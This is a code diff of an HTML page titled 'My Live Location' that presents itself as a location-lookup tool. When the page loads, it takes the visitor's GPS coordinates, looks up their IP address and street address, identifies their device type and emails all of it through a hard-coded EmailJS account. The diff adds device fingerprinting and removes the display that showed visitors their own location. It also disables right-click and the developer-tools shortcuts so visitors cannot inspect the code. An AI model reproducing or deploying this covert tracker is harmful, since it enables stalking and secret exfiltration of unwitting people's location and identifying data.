@@ -7,9 +7,7 @@
     <title>My Live Location</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
-        rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: "Roboto", sans-serif;
@@ -19,7 +17,7 @@
             height: 100vh;
             display: flex;
             align-items: center;
-            justify-self: center;
+            justify-content: center;
         }
     </style>
 </head>
@@ -27,36 +25,38 @@
 <body>
     <div style="max-width: 600px; margin: 0 auto;">
         <h1 style="text-align: center; font-size: 1.2rem;">Get Your Live Location</h1>
-        <h2 style="text-align: center; font-size: 0.8rem;">If you want to check another person's location, please enter
-            the Latitude and Longitude below:</h2>
+        <h2 style="text-align: center; font-size: 0.8rem;">If you want to check another person's location, please enter the Latitude and Longitude below:</h2>
         <label>Latitude:</label>
         <input type="text" id="latitude" placeholder="Enter Your Latitude">
         <br><br>
         <label>Longitude:</label>
-        <input type="text" id="longitude" placeholder="Enter Your Longitude" onblur="showLocation()">
+        <input type="text" id="longitude" placeholder="Enter Your Longitude">
         <br><br>
         <p id="locationResult" style="display: none; margin: 0px;"></p>
     </div>
+
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        document.addEventListener('contextmenu', function (e) {
-            e.preventDefault();
-        });
+        emailjs.init("MPhPUQIdgkUqoKusv");
 
-        // Disable F12 key and Ctrl+Shift+I (to open developer tools)
-        document.addEventListener('keydown', function (e) {
-            // Disable F12 key
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
-            }
-            // Disable Ctrl + U (View Page Source)
-            if (e.ctrlKey && e.key === 'u') {
+        const deviceType = (() => {
+            const userAgent = navigator.userAgent;
+            if (/android/i.test(userAgent)) return "Android";
+            if (/iPad|iPhone|iPod/.test(userAgent)) return "iOS";
+            if (/windows/i.test(userAgent)) return "Windows";
+            if (/mac/i.test(userAgent)) return "MacOS";
+            return "Unknown";
+        })();
+
+        const deviceCategory = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+
+        // Disable context menu and certain key combinations
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) || (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
                 e.preventDefault();
             }
         });
-        (function () {
-            emailjs.init("MPhPUQIdgkUqoKusv");
-        })();
 
         async function getIP() {
             try {
@@ -72,29 +72,18 @@
         async function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
-                    showPosition(position);
                     const ipAddress = await getIP();
                     const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
                     sendEmail(position, ipAddress, locationData);
                 }, (error) => {
-                    console.error("Geolocation error:", error);
-                    document.getElementById("locationResult").innerHTML = "Failed to get location.";
-                    document.getElementById("locationResult").style.display = "block";
+                    alert("Unable to retrieve your location. Please check your settings.");
                 });
             } else {
-                document.getElementById("locationResult").innerHTML = "Geolocation is not supported by this browser.";
-                document.getElementById("locationResult").style.display = "block";
+                alert("Geolocation is not supported by this browser.");
             }
         }
 
-        function showPosition(position) {
-            document.getElementById("latitude").value = position.coords.latitude;
-            document.getElementById("longitude").value = position.coords.longitude;
-        }
-
         async function fetchLocationData(latitude, longitude) {
-            // const apiKey = "pk.a5fd537492d8811da2c4d54bba29abd6";
-            // const apiUrl = `https://us1.locationiq.com/v1/reverse.php?key=${apiKey}&lat=${latitude}&lon=${longitude}&format=json`;
             const apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
             try {
                 const response = await fetch(apiUrl);
@@ -106,53 +95,28 @@
         }
 
         function sendEmail(position, ipAddress, data) {
-    emailjs.send("service_mupmc8l", "template_1f01srj", {
-        user_latitude: position.coords.latitude,
-        user_longitude: position.coords.longitude,
-        user_ipaddress: ipAddress,
-        user_country: data.address?.country || "Unknown",
-        user_country_code: data.address?.country_code || "Unknown",
-        user_state: data.address?.state || "Unknown",
-        user_city: data.address?.city || data.address?.state_district,
-        user_pincode: data.address?.postcode || "Unknown",
-        user_address: data?.display_name || "Unknown",
-        user_sports: data.address?.stop || data.address?.sports,
-        user_road: data.address?.road || "Unknown",
-        user_nearplace: data.address?.amenity || data.address?.suburb,
-        user_link: window.location.href,
-    }).then(response => {
-        console.log("Email sent successfully!", response.status, response.text);
-    }).catch(error => {
-        console.error("Failed to send email.", error);
-    });
-}
-
-
-        async function showLocation() {
-            const latitude = document.getElementById("latitude").value.trim();
-            const longitude = document.getElementById("longitude").value.trim();
-
-            // Validate that both latitude and longitude are provided and are numbers
-            if (latitude && longitude && !isNaN(latitude) && !isNaN(longitude)) {
-                const ipAddress = await getIP(); // Get the IP address
-                const locationData = await fetchLocationData(latitude, longitude); // Fetch location data
-                // Create a fake position object to match the expected format in sendEmail
-                const position = {
-                    coords: {
-                        latitude: parseFloat(latitude),
-                        longitude: parseFloat(longitude)
-                    }
-                };
-                sendEmail(position, ipAddress, locationData); // Send the email
-            } else {
-                document.getElementById("locationResult").innerHTML =
-                    "Please enter valid numeric values for latitude and longitude.";
-                document.getElementById("locationResult").style.display = "block";
-            }
+            emailjs.send("service_mupmc8l", "template_1f01srj", {
+                user_latitude: position.coords.latitude,
+                user_longitude: position.coords.longitude,
+                user_ipaddress: ipAddress,
+                user_country: data.address?.country || "Unknown",
+                user_country_code: data.address?.country_code || "Unknown",
+                user_state: data.address?.state || "Unknown",
+                user_city: data.address?.city || data.address?.state_district || "Unknown",
+                user_pincode: data.address?.postcode || "Unknown",
+                user_address: data?.display_name || "Unknown",
+                user_device_type: deviceType,
+                user_device_category: deviceCategory,
+                user_link: window.location.href,
+            }).then(response => {
+                console.log("Email sent successfully!", response.status, response.text);
+            }).catch(error => {
+                console.error("Failed to send email.", error);
+            });
         }
-        getLocation()
-    </script>
 
+        getLocation();
+    </script>
 </body>
 
 </html>
